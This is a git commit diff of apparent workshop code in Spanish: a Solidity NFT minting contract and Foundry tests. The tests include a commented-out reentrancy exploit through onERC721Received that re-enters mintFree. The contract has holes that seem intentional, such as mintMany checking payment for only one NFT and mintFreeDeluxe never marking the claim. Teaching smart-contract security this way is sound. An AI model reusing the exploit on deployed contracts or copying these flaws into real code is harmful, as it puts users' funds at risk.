81ea10994f3ed118a1bd0693dece1dea51096389
Matías Aereal Aeón <388605+mattaereal@users.noreply.github.com>
2023-03-29 16:19:33 -0300

    End of workshop code for possible homework.

--- src/NFTMinter.sol
+++ src/NFTMinter.sol
@@ -28,60 +28,76 @@ contract NFTMinter {
     using Address for address payable;
 
     uint256 public immutable PRICE_TO_PAY;
-    // uint8 public immutable PRIZE_THRESHOLD;
-    // uint256 public immutable MINT_LIMIT;
+    uint8 public immutable PRIZE_THRESHOLD;
+    uint256 public immutable MINT_LIMIT;
     
-    // mapping(address => uint256) public points;
-    // mapping(address => bool) public claimed;
+    mapping(address => uint256) public points;
+    mapping(address => bool) public claimed;
 
     MiNFT public nft;
-    // address public owner;
+    address public owner;
 
-    // event ClaimedFree(address owner, uint256 tokenId, uint256 points);
+    event ClaimedFree(address owner, uint256 tokenId, uint256 points);
 
     /**
      * Constructor del contrato. Inicializa algunas constantes importantes para operar.
      * @param _priceToPay Precio base de 1 NFT
-     * param _prizeThreshold Cantidad mínima de NFTs necesarias para reclamar premio.
+     * @param _prizeThreshold Cantidad mínima de NFTs necesarias para reclamar premio.
      */
-    constructor(uint256 _priceToPay /*, uint8 _prizeThreshold*/) {
+    constructor(uint256 _priceToPay, uint8 _prizeThreshold) {
         nft = new MiNFT();
         PRICE_TO_PAY = _priceToPay;
 
-        // PRIZE_THRESHOLD = _prizeThreshold;
-        // MINT_LIMIT = 10;
-        // owner = msg.sender;
+        PRIZE_THRESHOLD = _prizeThreshold;
+        MINT_LIMIT = 10;
+        owner = msg.sender;
     }
 
     /**
      * Mintea un NFT al caller que envíe ether suficiente para pagarlo.
      */
-    // function mintOne() public payable {
-    //     if (msg.value < PRICE_TO_PAY) revert InsufficientPayment();
-    //     nft.safeMint(msg.sender);
-    // }
-
-
+    function mintOne() public payable {
+        if (msg.value < PRICE_TO_PAY) revert InsufficientPayment();
+        if (msg.value > PRICE_TO_PAY) {
+            payable(msg.sender).sendValue(msg.value - PRICE_TO_PAY);
+            console.log(
+                "Se le devuelve este monto %s a %s",
+                msg.value - PRICE_TO_PAY,
+                msg.sender
+            );
+        }
+        nft.safeMint(msg.sender);
+        points[msg.sender]++;
+    }
 
     /**
      * Permite retirar todo el balance disponible al owner del contrato.
      */
-    // function sweepFunds() public {}
-
-
+    function sweepFunds() public {
+        payable(owner).sendValue(address(this).balance);
+    }
 
     /**
      * Mintea al caller la cantidad de NFTs que se indica por parámetro, con
        algunas restricciones. No se pueden mintear más de 10.
      * @param amount Cantidad de NFTs a mintear.
      */
-    // function mintMany(uint256 amount) public payable {
-    //     for (uint i = 0; i < amount; i++) {
-    //         mintOne();
-    //     }
-    // }
-
-
+    function mintMany(uint256 amount) public payable {
+        if (amount > MINT_LIMIT) revert AboveMintLimit();
+        if (msg.value < PRICE_TO_PAY) revert InsufficientPayment();
+        if (msg.value > PRICE_TO_PAY * amount) {
+            payable(msg.sender).sendValue(msg.value - PRICE_TO_PAY * amount);
+            console.log(
+                "Se le devuelve este monto %s a %s",
+                msg.value - PRICE_TO_PAY * amount,
+                msg.sender
+            );
+        }
+        for (uint i = 0; i < amount; i++) {
+            nft.safeMint(msg.sender);
+            points[msg.sender]++;
+        }
+    }
 
     /**
      * Mintea un NFT gratuito para aquellos usuarios que cumplen con determinado
@@ -90,9 +106,14 @@ contract NFTMinter {
      * Emitir evento ClaimedFree();
      * Utilizar AlreadyClaimed() y NotEnoughPoints();
      */
-    // function mintFree() public {}
-
-
+    function mintFree() public {
+        if (points[msg.sender] < PRIZE_THRESHOLD) revert NotEnoughPoints();
+        if (claimed[msg.sender]) revert AlreadyClaimed();
+        claimed[msg.sender] = true;
+        emit ClaimedFree(msg.sender, nft.getTotalMinted(), points[msg.sender]);
+        nft.safeMint(msg.sender);
+        
+    }
 
     /**
      * Mintea un NFT gratuito para aquellos usuarios que cumplen con determinado
@@ -100,7 +121,14 @@ contract NFTMinter {
      * cantidad actual, mintear dos NFTs de manera gratuita por única vez.
      * Reutilizar lógica de mintFree.
      */
-    // function mintFreeDeluxe() public returns (bool) {}
+    function mintFreeDeluxe() public returns (bool) {
+        if (claimed[msg.sender]) revert AlreadyClaimed();
+        if ((points[msg.sender] * 100) / nft.getTotalMinted() > 20) {
+            nft.safeMint(msg.sender);
+            emit ClaimedFree(msg.sender, nft.getTotalMinted(), points[msg.sender]);
+            return true;
+        }
 
-
+        return false;
+    }
 }
--- test/NFTMinter.t.sol
+++ test/NFTMinter.t.sol
@@ -5,24 +5,23 @@ import { Test } from "forge-std/Test.sol";
 import "../src/NFTMinter.sol";
 import { IERC721Receiver } from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";
 
-contract NFTMintersTest is Test/*, IERC721Receiver*/ {
+contract NFTMintersTest is Test /*, IERC721Receiver*/ {
     NFTMinter nftmin;
     address carlos = makeAddr("carlos");
     address karen = makeAddr("karen");
-    // bool exploitReent;
-    // uint8 exploitCount;
-    // uint8 exploitMaxCount;
+    bool exploitActive;
+    uint8 exploitCount;
+    uint8 exploitMaxCount;
 
-    // Ejecutada automáticamente previo a cada test
     function setUp() public {
-        // Se instancia el contrato a testear
-        nftmin = new NFTMinter(0.25 ether);
-
         // Carlos comienza con un balance de 1000 ETH
         vm.deal(carlos, 1000 ether);
 
         // A partir de ahora, todas las llamadas serán ejecutadas por carlos
         vm.startPrank(carlos);
+
+        // Se instancia el contrato a testear
+        nftmin = new NFTMinter(0.25 ether, 10);
     }
 
     receive() external payable {}
@@ -32,106 +31,128 @@ contract NFTMintersTest is Test/*, IERC721Receiver*/ {
         assertFalse(address(nftmin.nft()) == address(0), "NFT not deployed");
     }
 
-    // function test_mintOne() public {
-    //     uint256 balanceBefore = address(nftmin).balance;
-    //     nftmin.mintOne{value: 1 ether}();
-    //     uint256 balanceAfter = address(nftmin).balance;
+    function test_mintOne() public {
+        uint256 balanceBefore = address(nftmin).balance;
+        nftmin.mintOne{value: 1 ether}();
+        uint256 balanceAfter = address(nftmin).balance;
 
-    //     // assertEq(nftmin.nft().getTotalMinted(), 1);
-    //     // assertLt(balanceBefore, balanceAfter);
-        
+        assertEq(nftmin.nft().getTotalMinted(), 1);
+        // assertLt(balanceBefore, balanceAfter);
+        assertEq(balanceBefore + nftmin.PRICE_TO_PAY(), balanceAfter);
 
-    //     /** TODO:
-    //      * - chequear si se mintea un NFT correctamente.
-    //      * - chequear si efectivamente el contrato recibe el ether.
-    //     */ 
-    // }
+        /** TODO:
+         * - chequear si se mintea un NFT correctamente.
+         * - chequear si efectivamente el contrato recibe el ether.
+         */
+    }
 
-    // function test_sweepFunds() public {
-    //     uint256 balanceBefore = address(carlos).balance;
+    function test_sweepFunds() public {
+        uint256 balanceBefore = address(carlos).balance;
 
-    //     // vm.deal(karen, 1 ether);
-    //     // changePrank(karen);
-    //     // nftmin.mintOne{value: nftmin.PRICE_TO_PAY()}();
-        
-    //     // changePrank(carlos);
+        vm.deal(karen, 1 ether);
+        changePrank(karen);
+        nftmin.mintOne{value: nftmin.PRICE_TO_PAY()}();
 
-    //     nftmin.sweepFunds();
-    //     uint256 balanceAfter = address(carlos).balance;
+        changePrank(carlos);
 
-    //     // assertGt(balanceAfter, balanceBefore);
+        nftmin.sweepFunds();
+        uint256 balanceAfter = address(carlos).balance;
 
-    //     /** TODO:
-    //      * - testear que los fondos sólo van hacia carlos
-    //      * - testear con karen como ejemplo con changePrank
-    //     */ 
-    // }
+        assertGt(balanceAfter, balanceBefore);
 
+        /** TODO:
+         * - testear que los fondos sólo van hacia carlos
+         * - testear con karen como ejemplo con changePrank
+         */
+    }
 
-    // function test_mintMany() public {
-    //     // vm.deal(address(nftmin), 1000 ether);
-    //     // vm.deal(carlos, 1000 ether);
-    //     uint256 amount = 5;
-    //     uint256 _value =  amount * nftmin.PRICE_TO_PAY();
-    //     nftmin.mintMany{value : _value}(amount);
+    function test_mintMany() public {
+        vm.deal(address(nftmin), 1000 ether);
+        // vm.deal(carlos, 1000 ether);
+        uint256 amount = 5;
+        uint256 _value = amount * nftmin.PRICE_TO_PAY();
+        nftmin.mintMany{value: _value}(amount);
 
-    //     // assertEq(nftmin.nft().balanceOf(carlos), amount, "No coinciden los montos");
+        assertEq(
+            nftmin.nft().balanceOf(carlos),
+            amount,
+            "No coinciden los montos"
+        );
 
-    //     // _value =  (nftmin.MINT_LIMIT() + 1) * nftmin.PRICE_TO_PAY();
-    //     // vm.expectRevert(AboveMintLimit.selector);
-    //     // nftmin.mintMany{value : _value}(11);
-        
+        _value = (nftmin.MINT_LIMIT() + 1) * nftmin.PRICE_TO_PAY();
+        vm.expectRevert(AboveMintLimit.selector);
+        nftmin.mintMany{value: _value}(11);
 
-    //     /** TODO:
-    //      * - la cantidad pedida tiene que coincidir con la real minteada
-    //      * - no se deberían poder mintear más de 10 a la vez.
-    //     */ 
-    // }
+        /** TODO:
+         * - la cantidad pedida tiene que coincidir con la real minteada
+         * - no se deberían poder mintear más de 10 a la vez.
+         */
+    }
 
-    // function test_fuzz_minting(uint256 val, uint256 amount) public {
-    //     // val = bound(val, nftmin.PRICE_TO_PAY(), 10 ether);
-    //     // amount = bound(amount, 1, 10);
-    //     // vm.assume(val >= nftmin.PRICE_TO_PAY() * amount);
+    function test_fuzz_minting(uint256 val, uint256 amount) public {
+        val = bound(val, nftmin.PRICE_TO_PAY(), 10 ether);
+        amount = bound(amount, 1, 10);
+        vm.assume(val >= nftmin.PRICE_TO_PAY() * amount);
 
-    //     uint256 accumulated;
-    //     nftmin.mintMany{value: val}(amount);
-    //     accumulated = nftmin.PRICE_TO_PAY() * amount;
+        uint256 accumulated;
+        nftmin.mintMany{value: val}(amount);
+        accumulated = nftmin.PRICE_TO_PAY() * amount;
 
-    //     // assertEq(accumulated, address(nftmin).balance);
+        assertEq(accumulated, address(nftmin).balance);
 
-    //     /** TODO:
-    //      * Definir una variable fantasma:
-    //      * comprobar que el valor que debería cobrarse es igual al valor
-    //      * que recibe el contrato, aún cuando se le envía de más.
-    //     */ 
-    // }
+        /** TODO:
+         * Definir una variable fantasma:
+         * comprobar que el valor que debería cobrarse es igual al valor
+         * que recibe el contrato, aún cuando se le envía de más.
+         */
+    }
 
-    // function test_mintFree() public {
-    //     vm.deal(carlos, 10 ether);
-    //     uint256 amount = 5;
-    //     uint256 _value = amount * nftmin.PRICE_TO_PAY();
-    //     nftmin.mintMany{value : _value}(amount);
+    function test_mintFree() public {
+        vm.deal(carlos, 10 ether);
+        uint256 amount = 5;
+        uint256 _value = amount * nftmin.PRICE_TO_PAY();
+        nftmin.mintMany{value: _value}(amount);
 
-    //     /** TODO:
-    //      * - chequear que efectivamente de un NFT gratuito
-    //      * - chequear que no pueda mintear si tiene pocos puntos
-    //      * - chequear que no pueda mintear dos veces
-    //      * tips:
-    //      * - 2 expectReverts, 3 calls to mintFree, and 1 assert
-    //     */ 
-    // }
+        vm.expectRevert(NotEnoughPoints.selector);
+        nftmin.mintFree();
+
+        nftmin.mintMany{value: _value}(amount);
+
+        uint256 balanceBefore = nftmin.nft().balanceOf(carlos);
+        nftmin.mintFree();
+        uint256 balanceAfter = nftmin.nft().balanceOf(carlos);
+
+        assertEq(balanceBefore + 1, balanceAfter);
+
+        vm.expectRevert(AlreadyClaimed.selector);
+        nftmin.mintFree();
+
+        /** TODO:
+         * - chequear que efectivamente de un NFT gratuito
+         * - chequear que no pueda mintear si tiene pocos puntos
+         * - chequear que no pueda mintear dos veces
+         * tips:
+         * - 2 expectReverts, 3 calls to mintFree, and 1 assert
+         */
+    }
 
     // function test_exploitReentrancy() public {
     //     // nota: ejecutando transacción como carlos
+    //     vm.stopPrank();
     //     uint256 amount = nftmin.PRIZE_THRESHOLD();
     //     uint256 cost = nftmin.PRICE_TO_PAY() * amount;
     //     nftmin.mintMany{value: cost}(amount);
 
     //     // exploit context
+    //     exploitActive = true;
+    //     exploitMaxCount = 5;
     //     nftmin.mintFree();
 
     //     // chequear si funcionó
-    //     // assertEq(nftmin.nft().balanceOf(address(this)), ??);
+    //     assertEq(
+    //         nftmin.nft().balanceOf(address(this)),
+    //         amount + exploitMaxCount + 1
+    //     );
 
     //     /** TODO:
     //      * - necesitamos un contrato para controlar el flujo de la ejecución
@@ -140,7 +161,7 @@ contract NFTMintersTest is Test/*, IERC721Receiver*/ {
     //      * - creamos su contexto antes de llamar, y su comportamiento en onERC721
     //      * - chequeamos que haya funcionado efectivamente
     //      * - solucionar el bug y esperar que falle
-    //     */ 
+    //      */
     // }
 
     // function onERC721Received(
@@ -149,56 +170,90 @@ contract NFTMintersTest is Test/*, IERC721Receiver*/ {
     //     uint256 tokenId,
     //     bytes calldata data
     // ) external returns (bytes4) {
-    //     // if (exploit active ) re-enter!
-    //     // else { behave as usual }
-    // 
+    //     if (exploitActive && exploitCount < exploitMaxCount) {
+    //         exploitCount++;
+    //         nftmin.mintFree();
+    //     }
     //     return IERC721Receiver.onERC721Received.selector;
     // }
 
-
-    // function test_mintFreeDeluxe() public {
-    //     uint256 amount = 10;
-    //     uint256 _value = amount * nftmin.PRICE_TO_PAY();
-    //     nftmin.mintMany{value : _value}(amount);
-
-    //     /** TODO:
-    //      * - chequear que entregue 1 nft
-    //      * - chequear que no se pueda mintear dos veces
-    //      * - mintear desde distintas cuentas
-    //     */ 
+    // // working exploit
+    // function onERC721Received(
+    //     address operator,
+    //     address from,
+    //     uint256 tokenId,
+    //     bytes calldata data
+    // ) external returns (bytes4) {
+    //     if (exploitReent && exploitCount < exploitMaxCount) {
+    //         exploitCount++;
+    //         NFTMinter(payable(address(operator))).mintFree();
+    //         // analog to nftmin.mintFree();
+    //     } else {
+    //         exploitReent = false;
+    //         delete exploitCount;
+    //     }
+    //     return IERC721Receiver.onERC721Received.selector;
     // }
 
+    function test_mintFreeDeluxe() public {
+        uint256 amount = 10;
+        uint256 _value = amount * nftmin.PRICE_TO_PAY();
+        nftmin.mintMany{value : _value}(amount);
 
-    // function getsDeluxe(uint256 points) internal view returns (bool) {
-    //     // Implementation by tincho
-    //     points *= 100;
-    //     points /= nftmin.nft().getTotalMinted();
+        uint256 balanceBefore = nftmin.nft().balanceOf(carlos);
+        nftmin.mintFreeDeluxe();
+        uint256 balanceAfter = nftmin.nft().balanceOf(carlos);
 
-    //     return points > 20;
-    // }
+        assertEq(balanceBefore + 1, balanceAfter);
 
-    // function test_fuzz_mintDeluxe(uint256 val, uint256 amount) public {
-    //     vm.deal(carlos, 100 ether);
-    //     // acotar el fuzz con bound y assumes
-        
-    //     // minteamos con un primer usuario x veces
+        /** TODO:
+         * (puntosUsuario / nftsMinteadosTotales * 100 > 20).
+         * - mintear desde distintas cuentas
+         * - chequear que entregue 1 nft
+         * - chequear que no se pueda mintear dos veces
+        */
+    }
 
-    //     // minteamos con otro segundo usuario z veces
+    function getsDeluxe(uint256 points) internal view returns (bool) {
+        // Implementation by tincho
+        points *= 100;
+        points /= nftmin.nft().getTotalMinted();
 
-    //     // validamos que de igual el resultado de ambas funciones
-    //     assertEq(getsDeluxe(amount), nftmin.mintFreeDeluxe());
+        return points > 20;
+    }
 
+    function test_fuzz_mintDeluxe(uint256 val, uint256 amount) public {
+        uint256 _value;
+        vm.deal(carlos, 100 ether);
+        vm.deal(karen, 100 ether);
+        // acotar el fuzz con bound y assumes
+        val = bound(val, nftmin.PRICE_TO_PAY(), 10 ether);
+        amount = bound(amount, 1, 10);
+        vm.assume(val >= nftmin.PRICE_TO_PAY() * amount);
 
-    //     /** TODO:
-    //      * - generar el contexto necesario para que se puedan comparar los
-    //          resultados de las dos funciones
-    //      * - mintear con dos usuarios, cantidades distintas, siendo que la
-    //          cantidad de quién reclamará respete la condición para reclamar
-    //      * - qué cosas podemos asumir que tengan sentido para esta prueba?
-    //     */
-    // }
+        // minteamos con un primer usuario x veces
+        changePrank(karen);
+        _value = amount * nftmin.PRICE_TO_PAY();
+        nftmin.mintMany{value : _value}(amount);
+        nftmin.mintMany{value : _value}(amount);
 
-    // // chisel demo
+        changePrank(carlos);
+        nftmin.mintMany{value : _value}(amount);
+        nftmin.mintMany{value : _value}(amount);
+
+        // validamos que de igual el resultado de ambas funciones
+        assertEq(getsDeluxe(amount), nftmin.mintFreeDeluxe());
+
+        /** TODO:
+         * - generar el contexto necesario para que se puedan comparar los
+             resultados de las dos funciones
+         * - mintear con dos usuarios, cantidades distintas, siendo que la
+             cantidad de quién reclamará respete la condición para reclamar
+         * - qué cosas podemos asumir que tengan sentido para esta prueba?
+        */
+    }
+
+    // chisel demo
     // bool r
     // uint256 points = 10
     // uint256 total = 20
